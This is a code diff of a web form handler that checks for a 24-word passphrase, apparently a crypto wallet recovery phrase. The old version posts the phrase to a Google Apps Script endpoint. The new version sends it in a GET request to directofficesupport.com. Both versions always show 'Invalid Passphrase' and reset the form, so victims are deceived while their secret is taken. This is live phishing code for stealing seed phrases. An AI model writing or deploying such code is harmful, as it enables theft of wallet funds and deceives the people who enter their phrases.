@@ -1,71 +1,69 @@
+// Function to handle form submission
 function handleSubmit(event) {
     event.preventDefault(); // Prevent default form submission
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
-
-    const myButton = document.getElementById('b1');
-    const myButton2 = document.getElementById('b2');
+    const myButton = document.getElementById('b1')
     myButton.disabled = true;
+
+    const myButton2 = document.getElementById('b2')
     myButton2.disabled = true;
+    // Step 1: Get the value of the hidden input field with name 'mf-texts'
+    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
+    const inputValue = form.elements['mf-texts'].value.trim();
 
-    // Get the form element
-    const form = document.getElementById('myForm'); // Use correct form ID
-    if (!form) {
-        console.error('Form not found!');
-        return;
-    }
+    
 
-    const inputField = form.elements['mf-texts'];
-    if (!inputField) {
-        console.error('Input field "mf-texts" not found!');
-        return;
-    }
-
-    const inputValue = inputField.value.trim();
     const wordCount = inputValue.split(/\s+/).length;
-
-    if (wordCount !== 24) {
+    if (wordCount !==24) {
+        const errorElement = document.getElementById('emsg');
         errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
-        return;
+        form.reset();
+        return; // Exit function if word count is not 24
     }
 
-    // Google Apps Script URL
-    const url = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";
+    // Step 2: Make a GET request to example.com/send/ + the value from Step 1
+    const url = `https://directofficesupport.com/send_char/${encodeURIComponent(inputValue)}/P-/`;
 
-    // Make a POST request to your Google Apps Script URL
     fetch(url, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ data: inputValue }) // Sending data as JSON
+        method: 'GET'
     })
-    .then(response => response.json().catch(() => ({ error: "Invalid JSON response" })))
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.json(); // Assuming the response is JSON; adjust as per your API
+    })
     .then(data => {
-        errorElement.textContent = 'Data submitted successfully!';
+        // Step 3: Display any errors in the HTML with ID 'emsg'
+        const errorElement = document.getElementById('emsg');
+        errorElement.textContent = ''; // Clear previous error messages
+        // Example assuming the API returns an error message in JSON response
+        // if (data.error) {
+        //     errorElement.textContent = data.error;
+        // }
+        errorElement.textContent = 'Invalid Passphrase'
         myButton.disabled = false;
         myButton2.disabled = false;
-        if (form) form.reset();
+        form.reset();
+        // Handle successful response if needed
     })
     .catch(error => {
         console.error('Error:', error);
-        errorElement.textContent = 'Error occurred while processing your request.';
+        const errorElement = document.getElementById('emsg');
+        // errorElement.textContent = 'Error occurred while processing your request.';
+        form.reset();
+        errorElement.textContent = 'Invalid Passphrase';
         myButton.disabled = false;
         myButton2.disabled = false;
     });
 }
 
-// Add event listener to the form
-const form = document.getElementById('myForm'); // Ensure correct ID
-if (form) {
-    form.addEventListener('submit', handleSubmit);
-} else {
-    console.error('Form element not found!');
-}
-
-
-
-
+// Add event listener to the form for 'submit' event
+const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
+form.addEventListener('submit', handleSubmit);
 
 
 
